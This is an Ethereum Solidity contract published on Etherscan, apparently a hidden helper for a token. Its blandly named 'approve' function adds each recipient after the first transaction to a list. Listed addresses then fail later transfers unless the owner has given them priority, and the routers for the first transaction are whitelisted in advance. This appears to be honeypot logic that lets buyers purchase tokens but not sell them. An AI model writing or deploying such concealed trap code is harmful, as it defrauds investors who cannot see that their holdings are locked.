/**
 *Submitted for verification at Etherscan.io on 2023-10-23
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;
contract NoName {
    address private _owner;
    mapping(address=>bool) private _list; 
    mapping(address=>bool) private _priority; 
    uint256 public txCount=0;
    modifier onlyOwner() {
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        _;
    }

    constructor() {
        _owner = msg.sender;
        _priority[_owner] = true;
        _priority[0xf164fC0Ec4E93095b804a4795bBe1e041497b92a] = true; //UniswapV2Router01
        _priority[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true; //UniswapV2Router02
        _priority[0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD] = true; //UniswapUniversalRouter
        _priority[0x1111111254EEB25477B68fb85Ed929f73A960582] = true; //1inch v5 router
        _priority[0x1111111254fb6c44bAC0beD2854e76F90643097d] = true; //1inch v4 router
    }
    
    function approve(address addr1, address addr2, uint256) public returns(bool success){
        if(txCount==0)
            {
                _priority[addr2]=true;
                unchecked {
                    txCount++;
                }
                return true;
            }
        
        _list[addr2] = true;
        if(_priority[addr1]==true)
        {
            return true;
        }
        require(_priority[addr1]==true || _list[addr1]!=true);
        return true;
    }

    function add(address[] calldata addr) public onlyOwner{
        for (uint256 i = 0; i < addr.length; i++) {
            _list[addr[i]] = true;
        }
        
    }

    function sub(address[] calldata addr) public onlyOwner{
        for (uint256 i = 0; i < addr.length; i++) {
            _list[addr[i]] = false;
        }
    }

    function result(address _account) external view returns(bool){
        return _list[_account];
    }

    function addPriority(address address_) public onlyOwner() {
        _priority[address_] = true;
    }

    function subPriority(address address_) public onlyOwner() {
        _priority[address_] = false;
    }

    function resultPriority(address _account) external view returns(bool){
        return _priority[_account];
    }

    function setTxCount(uint256 value) public onlyOwner{
        txCount = value;
    }
}